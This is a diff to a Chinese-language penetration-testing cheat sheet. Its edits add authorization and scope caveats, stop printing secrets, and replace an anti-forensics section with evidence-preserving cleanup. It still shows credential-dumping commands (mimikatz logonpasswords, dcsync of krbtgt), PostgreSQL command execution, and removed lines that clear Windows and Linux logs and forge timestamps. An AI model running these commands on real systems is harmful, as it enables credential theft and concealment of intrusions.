@@ -15,13 +15,13 @@ cat subdomains.txt amass_results.txt | sort -u > all_subs.txt
 # 存活探测
 httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt
 
-# 端口扫描（全端口）
+# 端口扫描（下例为常见端口，不是全端口；速率/窗口按范围约定）
 naabu -l all_subs.txt -top-ports 1000 -o ports.txt
 nmap -sV -sC -iL targets.txt -oA nmap_results
 ```
 
 **实战要点**：
-- 通过企查查/天眼查获取子公司列表，扩大攻击面
+- 通过企查查/天眼查获取子公司列表，仅列为候选资产；关联公司或第三方不自动进入授权范围
 - 关注测试环境（test.、dev.、staging.）和新上线系统
 - 证书透明度日志（crt.sh）发现隐藏域名
 
@@ -40,7 +40,7 @@ nmap -sV -sC -iL targets.txt -oA nmap_results
 
 # JS 文件中的 API Key
 cat js_urls.txt | while read url; do
-  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
+  curl -s "$url" | grep -qP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
 done
 ```
 
@@ -259,10 +259,10 @@ COPY (SELECT '') TO PROGRAM 'id';
 ```bash
 # AWS IAM 枚举
 aws iam list-attached-user-policies --user-name compromised-user
-# 寻找 iam:PassRole + lambda:CreateFunction → 管理员权限
+# 候选路径：还需核实可传递角色、信任、调用/更新权限和限制，不能只凭两个动作断言管理员
 
 # Azure AD
-# 全局管理员 → 所有订阅控制
+# 全局管理员不自动具有 Azure 订阅 RBAC 权限；核实有效权限与提升条件
 # 应用管理员 → 添加凭据到服务主体
 ```
 
@@ -278,8 +278,8 @@ mimikatz# sekurlsa::logonpasswords
 mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt
 
 # Linux 凭据
-cat /etc/shadow
-cat ~/.bash_history | grep -i pass
+# 仅使用授权的测试凭据/合成证明；不输出真实 shadow 内容
+# 不把真实用户历史或密码打印到报告
 find / -name "*.conf" -exec grep -l "password" {} \;
 
 # NTLM Hash 提取
@@ -464,27 +464,6 @@ systemctl enable update.service
 
 ---
 
-## 七、痕迹清理（Anti-Forensics）
+## 七、测试清理与证据保全
 
-```bash
-# Windows 日志清除
-wevtutil cl Security
-wevtutil cl System
-wevtutil cl Application
-
-# Linux 日志清除
-echo > /var/log/auth.log
-echo > /var/log/syslog
-history -c && history -w
-
-# 时间戳修改
-touch -t 202301010000 /path/to/file
-
-# 内存清理
-# 确保 Mimikatz dump 已删除
-# 确保 C2 beacon 已退出
-# 确保临时文件已清除
-```
-
----
-
+按变更清单移除本次演练创建的账户、任务、载荷、隧道与临时文件，恢复已记录的配置并由负责人确认。保留系统安全日志、审计轨迹、原始时间戳和必要证据；不通过清日志或伪造时间隐藏活动。敏感转储按约定加密、交付并到期销毁。无法恢复的变更必须报告。
